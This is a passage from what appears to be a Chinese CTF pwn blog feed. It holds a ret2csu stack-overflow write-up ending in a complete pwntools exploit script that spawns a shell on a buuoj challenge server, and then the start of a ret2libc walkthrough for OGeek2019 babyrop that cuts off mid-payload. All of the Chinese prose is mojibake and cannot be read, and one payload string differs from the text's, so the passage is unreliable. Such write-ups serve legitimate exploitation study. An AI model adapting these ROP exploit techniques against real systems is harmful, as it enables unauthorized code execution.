æ³•è¦†ç›–è¿”å›åœ°å€çš„ã€‚</p><hr><p>è€Œä¸”ç”±äºæˆ‘ä»¬è¦è°ƒç”¨æ ˆä¸Šçš„æ•°æ®ï¼Œä¸”æ ˆæ˜¯åŠ¨æ€çš„ï¼Œæˆ‘ä»¬æ— æ³•å‡†ç¡®å¾—çŸ¥æˆ‘ä»¬å†™çš„<code>/bin/sh</code>å­—ç¬¦ä¸²çš„æ‰€åœ¨ä½ç½®ï¼Œå› æ­¤æˆ‘ä»¬ç¬¬ä¸€æ¬¡æº¢å‡ºå¯è°“æ˜¯èº«è´Ÿé‡æ‹…ï¼Œä¸ä»…è¦æä¾›<code>/bin/sh</code>å­—ç¬¦ä¸²è¿˜è¦æ³„éœ²æ ˆçš„åœ°å€ã€‚ç”±äºç¨‹åºåªæœ‰ä¸‹é¢çš„</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sys_write(<span class="number">1u</span>, buf, <span class="number">0x30</span>uLL);</span><br></pre></td></tr></table></figure><p>å› æ­¤æˆ‘ä»¬å¿…é¡»é€šè¿‡è¿™ä¸ªå‡½æ•°æ³„éœ²ç‚¹ä»€ä¹ˆã€‚</p><p>æƒ³æƒ³å½“æ—¶ç¨‹åºè°ƒç”¨çš„æ ˆå¸§æ˜¯ä»€ä¹ˆæ ·çš„ï¼Œä»€ä¹ˆå†…å®¹æ˜¯è·Ÿæ ˆçš„åœ°å€æœ‰å…³çš„ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ä½åœ°å€â†‘</span><br><span class="line">buf in vlun</span><br><span class="line"></span><br><span class="line">rbp for main</span><br><span class="line">rip for main</span><br><span class="line">rbp for main&#x27;s father function</span><br><span class="line">rip for main&#x27;s father function</span><br><span class="line">é«˜åœ°å€â†“</span><br></pre></td></tr></table></figure><p>å¦‚æ­¤æˆ‘ä»¬ä¹Ÿå¯ä»¥æ¸…æ¥šçœ‹åˆ°ï¼Œé¦–å…ˆmainçš„rbpæ˜¯è‚¯å®šè¢«æˆ‘ä»¬è¦†ç›–äº†çš„(PS è™½ç„¶ç°åœ¨å¥½åƒæ˜¯æ²¡æœ‰çš„)ï¼Œç„¶ååé¢è¿˜æœ‰ä¸€ä¸ªè°ƒç”¨mainå‡½æ•°çš„é‚£ä¸ªå‡½æ•°çš„rbpï¼Œé‚£ä¸ªå¯ä»¥ç¡®å®šæ ˆçš„åœ°å€ï¼Œèƒ½è¾“å‡ºè¿™ä¸ªä¹‹åæˆ‘ä»¬å°±å¯ä»¥å¼€å§‹ç®—åç§»äº†ã€‚</p><p>gdbè°ƒè¯•ç®—ç®—rbpä¸å®ƒä»¬ä¹‹é—´çš„åç§»ï¼Œè¿™é‡Œéœ€è¦æ³¨æ„ç”±äºæ ˆä¸å¹³è¡¡çš„åŸå› ï¼Œæˆ‘ä»¬éœ€è¦æ‰‹åŠ¨è°ƒä¸€ä¸‹ripè®©ç¨‹åºä¸è¦å¼‚å¸¸é€€å‡ºï¼Œç„¶åæˆ‘ä»¬è°ƒè¯•åˆ°leaveæŒ‡ä»¤å¯ä»¥è§‚å¯Ÿåˆ°æ­¤æ—¶çš„æ ˆã€‚</p><p><img src="/2021/05/22/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E5%AD%A6%E4%B9%A0/2.png" alt="2"></p><p>åœ¨åœ°å€0x7fffffffde20çš„åœ°æ–¹å­˜äº†__libc_start_mainå‡½æ•°çš„rbp=0x7fffffffdf28ï¼Œé‚£ä¹ˆè®¡ç®—ä¸€ä¸‹åç§»å°±æ˜¯264ï¼Œå½“å‰çš„rspæ˜¯mainå‡½æ•°çš„rspæ˜¯vlunå‡½æ•°çš„rbpï¼Œæ‰€ä»¥æˆ‘ä»¬æ³„éœ²å‡ºæ¥çš„è¿™ä¸ªåœ°å€ä¸vlunå‡½æ•°çš„rbpåç§»äº†264å­—èŠ‚ï¼Œç„¶åå†æœ‰16å­—èŠ‚çš„ç¼“å†²åŒºï¼Œå¦‚æœæˆ‘ä»¬å†ç¼“å†²åŒºå¼€å§‹å†™å…¥<code>/bin/sh</code>å­—ç¬¦ä¸²çš„è¯é‚£ä¹ˆåç§»å°±æœ‰280å­—èŠ‚çš„å¤§å°ã€‚</p><p>ç„¶è€Œè¿™äº›åº”è¯¥æ˜¯ç¬¬äºŒæ¬¡æº¢å‡ºè€ƒè™‘çš„é—®é¢˜ï¼Œè¿™é‡Œåªæ˜¯åˆ†æä¸€ä¸‹æ³„éœ²åœ°å€çš„å¯è¡Œæ€§ã€‚</p><p>ç¬¬ä¸€æ¬¡çš„payloadæ¯”è¾ƒç®€å•</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload=<span class="string">b&#x27;/bin/sh\0&#x27;</span>*<span class="number">2</span>+p64(main)</span><br></pre></td></tr></table></figure><p>ç„¶åæ¥å—å‡†å¤‡æ¥æ”¶rbpï¼Œä½†æ˜¯åœ¨æ”¹ripçš„è¿‡ç¨‹ä¸­å‘ç°è¿™é‡Œè¿˜æ˜¯æœ‰0x20ä¸ªå­—èŠ‚æ‰èƒ½åˆ°rbpçš„ï¼Œä½†æ˜¯æˆ‘èƒ½ç›´æ¥ç•¥è¿‡rbpè¦†ç›–ripå°±æœ‰ç‚¹ç¦»è°±ï¼Œå°±ä¸çŸ¥é“mainçš„rbpæ˜¯å­˜åœ¨å“ªäº†ï¼Œä¹Ÿè®¸æ˜¯å­˜åœ¨ripåé¢äº†ã€‚è¿™ä¸ªæˆ‘ä¹Ÿä¸å¤ªèƒ½è®²çš„æ¸…æ¥šï¼Œå¸Œæœ›æœ‰å¸ˆå‚…æ˜ç™½çš„è¯èƒ½ä¸ºæˆ‘è§£ç­”ä¸€ä¸‹ï¼Œæ„Ÿæ¿€ä¸å°½ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">p.sendline(payload)</span><br><span class="line">p.recv(<span class="number">0x20</span>)</span><br><span class="line">rbp=u64(p.recv(<span class="number">8</span>))</span><br><span class="line">bin_sh=rbp-<span class="number">280</span><span class="comment">#æ³¨æ„ä¸€ä¸‹æ ˆå¾€ä½åœ°å€å¢é•¿</span></span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆç¬¬ä¸€æ¬¡æº¢å‡ºå®Œç¾çš„æ„é€ äº†<code>/bin/sh</code>å­—ç¬¦ä¸²å¹¶ä¸”è·å¾—äº†å®ƒçš„åœ°å€ã€‚</p><h3 id="ç¬¬äºŒæ¬¡æº¢å‡º"><a href="#ç¬¬äºŒæ¬¡æº¢å‡º" class="headerlink" title="ç¬¬äºŒæ¬¡æº¢å‡º"></a>ç¬¬äºŒæ¬¡æº¢å‡º</h3><p>ç¬¬äºŒæ¬¡æº¢å‡ºè¦å‡†å¤‡çš„ä¸œè¥¿å°±æœ‰ç‚¹å¤šäº†ã€‚</p><h4 id="å¯»æ‰¾gadget"><a href="#å¯»æ‰¾gadget" class="headerlink" title="å¯»æ‰¾gadget"></a>å¯»æ‰¾gadget</h4><p>æˆ‘ä»¬éœ€è¦çš„gadgetæœ‰</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pop rax</span><br><span class="line">syscall</span><br><span class="line">pop rdi</span><br><span class="line">pop rsi</span><br><span class="line">pop rdx</span><br></pre></td></tr></table></figure><p>ç»è¿‡åŠªåŠ›çš„å¯»æ‰¾æˆ‘ä»¬æ‰¾åˆ°äº†mov rax,59ç”¨äºä»£æ›¿pop raxï¼Œsyscallæœ¬æ¥å°±æœ‰ï¼Œpop rdiå¾ˆå¥½æ‰¾ï¼Œpop rsiä¹Ÿæœ‰ï¼Œå”¯ç‹¬å°±æ˜¯pop rdxæ‰¾ä¸ç€ï¼Œä½†æ˜¯å…³äºrbxçš„gadgetå¯ä»¥çœ‹åˆ°æœ‰ä¸€ä¸ªmov rdx,r13ï¼Œåœ¨libc_csu_initå‡½æ•°æœ‰ä¸€å †çš„popå¯„å­˜å™¨çš„æ“ä½œï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥å¾ˆå®¹æ˜“æ‰¾åˆ°pop r13ï¼Œé‚£ä¹ˆpop r13å’Œmov rdx,r13ä¸¤ä¸ªä¸€ç»“åˆä¸å°±æ˜¯pop rdxå˜›ï¼Œå¯¹å§ã€‚</p><p>ä½†æ˜¯éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œmov rdx,r13åé¢è·Ÿçš„å¹¶ä¸æ˜¯retï¼Œæ‰€ä»¥åœ¨æ‰§è¡Œmov rdx,13è¿™ä¸ªgadgetæ—¶å€™ï¼Œè¦æŠŠripåŠæ—¶åœ°åŠ«æŒå›æ¥ã€‚å®ƒè¿è¡Œåˆ°åé¢ä¹‹åä¼šæ‰§è¡Œcall ptr[r12+rbx*8]ï¼Œå¹¶ä¸”ï¼Œrbx,rbp,r12~r15éƒ½æ˜¯æˆ‘ä»¬å¯ä»¥éšæ„æ”¹çš„ã€‚</p><p>rbxæˆ‘ä»¬ç½®é›¶ï¼Œr12æˆ‘ä»¬æ”¾åœ¨æˆ‘ä»¬payloadä¸Šé¢çš„å…¶ä¸­ä¸€ä¸ªåœ°æ–¹èƒ½è®©å®ƒæ¥ç€æ‰§è¡Œå°±å¯ä»¥äº†ã€‚</p><p>é‚£ä¹ˆæˆ‘ä»¬å…ˆå†™payload</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload=<span class="string">b&#x27;/bin/sh\0&#x27;</span>*<span class="number">2</span>+p64(pop_rbx_rbp)+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(bin_sh+<span class="number">0x50</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+p64(mov_rdx)+p64(mov_rax)+p64(pop_rdi)+p64(bin_sh)+p64(syscall)</span><br></pre></td></tr></table></figure><p>å°±æ˜¯åŸæœ¬ä¼ ç»™r12çš„åç§»æˆ‘ç”¨çš„æ˜¯+0x48çš„ï¼Œç»“æœç»™æŠ¥é”™äº†ï¼Œåæ­£è¿™ä¸ªé¢˜æŒºç¥å¥‡çš„ï¼Œå°±æ˜¯æ„Ÿè§‰å°‘äº†å…«å­—èŠ‚çš„æ•°æ®åœ¨é‡Œé¢ä½†æ˜¯å¥½åƒåˆæ²¡å°‘ï¼Œå¸Œæœ›æœ‰å¸ˆå‚…èƒ½ä¸ºæˆ‘è§£ç­”ä¸€ä¸‹è¿™ä¸ªå›°æƒ‘ï¼Œä½†æ˜¯æˆ‘ä¸€èˆ¬é‡åˆ°è¿™ç§æƒ…å†µå°±åç§»å¤š8å°‘8éƒ½è¯•è¯•çœ‹ï¼Œå¦‚æœæ˜¯32ä½é‚£å°±ä¸Šä¸‹åç§»4çœ‹çœ‹ã€‚</p><p>æœ€åç»™å¸ˆå‚…ä»¬çœ‹çœ‹ç»“æœå§</p><p><img src="/2021/05/22/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E5%AD%A6%E4%B9%A0/3.png" alt="3"></p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">28330</span>)</span><br><span class="line">main=<span class="number">0x0004004ED</span></span><br><span class="line">mov_rax=<span class="number">0x04004E2</span></span><br><span class="line">pop_rdi=<span class="number">0x4005a3</span></span><br><span class="line">pop_rbx_rbp_r12_r13_r14_r15=<span class="number">0x40059A</span></span><br><span class="line">mov_rdxr13_call=<span class="number">0x0400580</span> </span><br><span class="line">syscall=<span class="number">0x00400517</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;/ban/sh\x00&#x27;</span>*<span class="number">2</span>+p64(main)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.recv(<span class="number">0x20</span>)</span><br><span class="line">rbp=u64(p.recv(<span class="number">8</span>))</span><br><span class="line">bin_sh=rbp-<span class="number">280</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;/bin/sh\0/bin/sh\0&#x27;</span>+p64(pop_rbx_rbp_r12_r13_r14_r15)+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(bin_sh+<span class="number">0x50</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+p64(mov_rdxr13_call)+p64(mov_rax)+p64(pop_rdi)+p64(bin_sh)+p64(syscall)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
          <category> re </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>ret2libcå®æˆ˜</title>
      <link href="/2021/05/13/ret2libc%E5%AE%9E%E6%88%98/"/>
      <url>/2021/05/13/ret2libc%E5%AE%9E%E6%88%98/</url>
      
        <content type="html"><![CDATA[<p><code>ret2libc</code>æ˜¯ä¸€ä¸ª<code>pwner</code>å¿…å¤‡çš„åŸºç¡€çŸ¥è¯†ã€‚</p><p><code>ret2libc</code>ä¸º<code> return to libc</code>çš„ç¼©å†™ï¼Œæˆ‘ä»¬éœ€è¦æ‰§è¡Œ<code>libc</code>å‡½æ•°é‡Œé¢çš„<code>system(&quot;/bin/sh&quot;)</code></p><p>ä¸‹é¢ä¸º32ä½ç¨‹åºå¹¶ä¸”å¸¦.soæ–‡ä»¶çš„é¢˜ç›®:<a href="https://buuoj.cn/challenges#[OGeek2019]babyrop">buuctfOGeek2019]babyrop</a></p><span id="more"></span><h2 id="OGeek2019-babyrop"><a href="#OGeek2019-babyrop" class="headerlink" title="[OGeek2019]babyrop"></a>[OGeek2019]babyrop</h2><p>ä¸‹è½½ä¸¤ä¸ªæ–‡ä»¶å…ˆä¸¢è¿›IDAé‡Œé¢</p><p>é¦–å…ˆæ˜¯pwn.elf</p><p><code>shift+F12</code>æŸ¥çœ‹å­—ç¬¦ä¸²ï¼Œçœ‹åˆ°æ¯”è¾ƒæœ‰ç”¨çš„å°±æ˜¯é‚£ä¸ª<code>Correct\n</code>ä½†æ˜¯è¿™ä¸ªä¸æ˜¯é€†å‘é¢˜ï¼Œä¸ç”¨ä»ç»“æœåˆ†æï¼Œæ‰€ä»¥è¿™ä¸ªä¹Ÿæ˜¯æ²¡ä»€ä¹ˆç”¨çš„ï¼Œåªèƒ½ç­‰ä¼šåˆ†ææ²¡æœ‰çœ‹åˆ°è¿™ä¸ªçš„æ—¶å€™å†å»æ•´è¿™ä¸ªã€‚ç„¶åä¹Ÿæ²¡æœ‰çœ‹åˆ°<code>/bin/sh</code>å­—ç¬¦ä¸²ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å…ˆæ”¾å¼ƒå­—ç¬¦ä¸²å…¥æ‰‹äº†ã€‚</p><p>æŸ¥çœ‹mainçš„ä¼ªCä»£ç ï¼Œå¾—åˆ°</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> buf; <span class="comment">// [esp+4h] [ebp-14h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v2; <span class="comment">// [esp+Bh] [ebp-Dh]</span></span><br><span class="line">  <span class="keyword">int</span> fd; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  sub_80486BB();</span><br><span class="line">  fd = open(<span class="string">&quot;/dev/urandom&quot;</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( fd &gt; <span class="number">0</span> )</span><br><span class="line">    read(fd, &amp;buf, <span class="number">4u</span>);</span><br><span class="line">  v2 = sub_804871F(buf);</span><br><span class="line">  sub_80487D0(v2);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é¦–å…ˆç»™ä½ è™šæ™ƒä¸€æªï¼Œè‡ªå·±è·å¾—ä¸€ä¸ªæˆ‘ä»¬ä¸çŸ¥é“çš„æ•°ï¼Œå¦‚æœå¤§äº0æ‰æ‰§è¡Œ<code>read(fd,&amp;buf,4u);</code>è€Œæˆ‘ä»¬éƒ½çŸ¥é“ï¼Œ<code>read()</code>å‡½æ•°ç¬¬ä¸€ä¸ªå‚æ•°å¿…é¡»ä¸º0æ‰èƒ½è®©æˆ‘ä»¬è¾“å…¥å†…å®¹ï¼Œé‚£ä¹ˆè¿™ä¸€æ®µä»£ç ç›´æ¥æŠ›å¼ƒï¼Œå®ƒæ³¨å®šå•¥ä¹Ÿå¹²ä¸äº†ã€‚ç„¶åæ‰§è¡Œäº†ä¸€ä¸ªå‡½æ•°ï¼Œè·Ÿè¿›å»çœ‹</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">sub_804871F</span><span class="params">(<span class="keyword">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> v1; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">32</span>]; <span class="comment">// [esp+Ch] [ebp-4Ch] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">32</span>]; <span class="comment">// [esp+2Ch] [ebp-2Ch] BYREF</span></span><br><span class="line">  <span class="keyword">ssize_t</span> v5; <span class="comment">// [esp+4Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="keyword">sizeof</span>(s));</span><br><span class="line">  <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">  <span class="built_in">sprintf</span>(s, <span class="string">&quot;%ld&quot;</span>, a1);</span><br><span class="line">  v5 = read(<span class="number">0</span>, buf, <span class="number">0x20</span>u);</span><br><span class="line">  buf[v5 - <span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  v1 = <span class="built_in">strlen</span>(buf);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strncmp</span>(buf, s, v1) )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">&quot;Correct\n&quot;</span>, <span class="number">8u</span>);</span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">unsigned</span> __int8)buf[<span class="number">7</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å› ä¸ºå‰é¢ä¼ å…¥çš„<code>buf</code>æŒ‡é’ˆæˆ‘ä»¬å¹¶ä¸å¯ä»¥è¾“å…¥ä»»ä½•å€¼ï¼Œåˆæ˜¯å±€éƒ¨å˜é‡ï¼Œæ‰€ä»¥å®ƒçš„å€¼ä¹Ÿæ˜¯ä¸ç¡®å®šçš„ï¼Œç„¶åä¸‹é¢æ¯”è¾ƒè¦æ±‚<code>buf==s</code>å­—ç¬¦ä¸²ï¼Œè€Œè¿™ä¸ª<code>s</code>æ˜¯<code>main()</code>çš„<code>buf</code>ï¼Œè¿™ä¸ªå‡½æ•°çš„<code>buf</code>æ˜¯æˆ‘ä»¬å¯ä»¥å†³å®šçš„ã€‚ä½†æ˜¯å¯æƒœå®ƒç”¨çš„æ˜¯<code>strncmp</code>æŒ‡å®šé•¿åº¦æ¯”è¾ƒå­—ç¬¦ä¸²ï¼Œè€Œé•¿åº¦æ˜¯ä»è¿™ä¸ªå‡½æ•°çš„bufé‡Œé¢ç®—åˆ°çš„ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥æŠŠå­—ç¬¦ä¸²ç¬¬ä¸€ä½ç½®ä¸º<code>\x00</code>ä»¥èº²è¿‡æ£€æµ‹ï¼Œç„¶åè¿”å›äº†<code>buf[7]</code>ï¼Œé‚£ä¹ˆè¿™é‡Œæˆ‘ä»¬å°±çŸ¥é“åº”è¯¥è¾“å…¥<code>\x00</code>å¼€å§‹çš„å­—ç¬¦ä¸²ï¼Œè‡³äºåé¢è¿˜å¾—çœ‹å®ƒè¿™ä¸ªè¿”å›å€¼å¹²äº†å•¥ï¼Œè¿”å›<code>main()</code>å‡½æ•°å‘ç°è¿”å›å€¼ä¸ºä¸‹ä¸€ä¸ªå‡½æ•°çš„å‚æ•°ï¼Œè€Œä¸‹ä¸€ä¸ªå‡½æ•°</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">ssize_t</span> __cdecl <span class="title">sub_80487D0</span><span class="params">(<span class="keyword">char</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">ssize_t</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">231</span>]; <span class="comment">// [esp+11h] [ebp-E7h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a1 == <span class="number">127</span> )</span><br><span class="line">    result = read(<span class="number">0</span>, buf, <span class="number">200u</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    result = read(<span class="number">0</span>, buf, a1);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¾ˆæ˜æ˜¾æˆ‘ä»¬è¦åœ¨è¿™é‡Œæº¢å‡ºäº†ï¼Œä½†æ˜¯ç¼“å†²åŒºå¤§å°æœ‰è¶³è¶³231ï¼Œè€Œç¬¬ä¸€ä¸ªé€‰é¡¹ä¸è¶³ä»¥è®©æˆ‘ä»¬æº¢å‡ºï¼Œæ‰€ä»¥æˆ‘ä»¬å¦‚æœæŠŠå‚æ•°è®¾ä¸º<code>\xff</code>é‚£ä¹ˆå°±èƒ½è¾“å…¥255é•¿åº¦çš„å­—ç¬¦ä¸²è¶³ä»¥è®©æˆ‘ä»¬æº¢å‡ºã€‚æ‰€ä»¥å‰é¢çš„ä¸€ä¸ª<code>payload</code>å°±å¯ä»¥è¿™ä¹ˆæ„é€ </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python</span><br><span class="line"></span><br><span class="line">payload1=b&#x27;\x00&#x27;*7+&#x27;\xff&#x27;</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯æ‰¾åˆ°äº†æº¢å‡ºç‚¹è¿˜ä¸å¤Ÿï¼Œæˆ‘ä»¬è¿˜æ²¡è·å–<code>system()</code>å‡½æ•°çš„åœ°å€ï¼Œåœ¨<code>plt</code>è¡¨ä¸Šä¹Ÿæ²¡æœ‰è¿™ä¸ªå‡½æ•°ï¼Œæ‰€ä»¥æˆ‘ä»¬æ‰“å¼€<code>.so</code>æ–‡ä»¶ï¼Œæ‰¾åˆ°<code>system()</code>å‡½æ•°å’Œ<code>/bin/sh</code>å­—ç¬¦ä¸²ã€‚æ³¨æ„æˆ‘ä»¬åæ±‡ç¼–çš„æ˜¯<code>libc</code>æ–‡ä»¶ï¼Œæ‰€ä»¥<code>system()</code>å‡½æ•°ä¸è·Ÿå¹³æ—¶ä¸€æ ·åœ¨<code>plt</code>è¡¨ï¼Œè€Œæ˜¯ç›´æ¥å†™åœ¨äº†ä»£ç æ®µä¸Šé¢ã€‚</p><p><img src="https://i.loli.net/2021/05/13/5LD7viZ3xtYj4he.png" alt="buuctf _OGeek2019_babyrop_1.png"></p><p><img src="https://i.loli.net/2021/05/13/dzPSurgwslqWIcU.png" alt="buuctf _OGeek2019_babyrop_2.png"></p><p>ä¸ºä»€ä¹ˆæœ‰è¿™ä¸€æ­¥å‘¢ï¼Ÿå› ä¸ºæˆ‘åœ¨å­¦ä¹ çš„è¿‡ç¨‹ä¸­ï¼Œå‘ç°<code>libcsearcher</code>ä¸å¥½ç”¨äº†ï¼Œåœ¨<code>python</code>é‡Œé¢åªèƒ½ç”¨<code>ELF()</code>å‡½æ•°å»åŠ è½½<code>.so</code>æ–‡ä»¶ï¼Œä½†æ˜¯æ— æ³•<code>search</code>åˆ°<code>/bin/sh</code>å­—ç¬¦ä¸²æ‰€ä»¥å°±å‡ºç°äº†è¿™ä¸€æ­¥ï¼Œç„¶åæˆ‘ä»¬éœ€è¦æ‰§è¡Œä¸¤æ¬¡è¿™ä¸ª<code>main()</code>å‡½æ•°ï¼Œå› ä¸ºç¬¬ä¸€æ¬¡æº¢å‡ºä½ åªèƒ½æ³„éœ²<code>libc</code>çš„åœ°å€ã€‚ç„¶åæˆ‘æ¥å›ç­”ä¸€ä¸‹ä¸ºä»€ä¹ˆä¸ç›´æ¥å†æ¬¡æ‰§è¡Œé‚£ä¸ªæº¢å‡ºçš„å‡½æ•°ï¼Œå› ä¸ºæˆ‘ä»¬è¦ä¼ å‚å¤§äº<code>0xe7+0x10</code>æ‰å¯ä»¥æº¢å‡ºï¼Œè€Œæ„é€ çš„<code>payload</code>é“¾åˆæ¯”è¾ƒéº»çƒ¦ï¼Œé‡æ–°æº¢å‡ºæœ€å¥½æŒ‘é‚£äº›æ²¡æœ‰å‚æ•°æˆ–è€…å‚æ•°å¯¹æˆ‘ä»¬å½±å“ä¸å¤§çš„å»é‡æ–°æ‰§è¡Œã€‚ç¬¬äºŒæ¬¡è¿˜å¥½è¯´ï¼Œç›´æ¥æŠŠ<code>system()</code>åœ°å€å’Œ<code>/bin/sh</code>çš„<code>payload</code>ä¼ è¿›å»å°±okã€‚</p><h3 id="ç¬¬ä¸€æ¬¡æº¢å‡ºæ³„éœ²libcçš„åœ°å€"><a href="#ç¬¬ä¸€æ¬¡æº¢å‡ºæ³„éœ²libcçš„åœ°å€" class="headerlink" title="ç¬¬ä¸€æ¬¡æº¢å‡ºæ³„éœ²libcçš„åœ°å€"></a>ç¬¬ä¸€æ¬¡æº¢å‡ºæ³„éœ²libcçš„åœ°å€</h3><p>æŒ‘é€‰èƒ½è¾“å‡ºçš„å‡½æ•°<code>write()</code>ï¼Œ<code>puts()</code>éƒ½è¡Œï¼Œä½†æ˜¯<code>write()</code>ä¼ å‚æ¯”è¾ƒå¤šï¼Œæ‰€ä»¥æˆ‘å°±ç”¨<code>write()</code>ï¼Œæ€•ä¸‡ä¸€é‡åˆ°æ²¡æœ‰<code>puts()</code>å°±ä¸ä¼šäº†ï¼Œæ‰€ä»¥å¤šä¼šç‚¹æ€»æ˜¯å¥½çš„ï¼Œæ¯”èµ›ä½ å½“ç„¶æ€ä¹ˆç®€å•æ€ä¹ˆæ¥ã€‚<code>write()</code>è¦ä¼ çš„å‚æ•°ç¬¬ä¸€ä¸ªä¼ 0ï¼Œç¬¬äºŒä¸ªä¼ è¦æ³„éœ²çš„<code>libc</code>å‡½æ•°çš„åœ°å€ï¼Œç¬¬ä¸‰ä¸ªå°±æ˜¯æ³„éœ²çš„å­—èŠ‚å¤§å°ï¼Œ32ä½ç¨‹åºå››å­—èŠ‚è¶³çŸ£ï¼Œä½ æ³„éœ²è‡ªå·±ä¹Ÿè¡Œï¼Œæˆ‘è¿™é‡Œé€‰äº†ä¸€ä¸ª<code>read()</code>å‡½æ•°ï¼Œé“ç†éƒ½æ˜¯ä¸€æ ·çš„ã€‚é‚£ä¹ˆç¬¬ä¸€æ¬¡çš„<code>payload</code>å°±å¯ä»¥æ„é€ å‡ºæ¥äº†</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0xe7</span>+<span 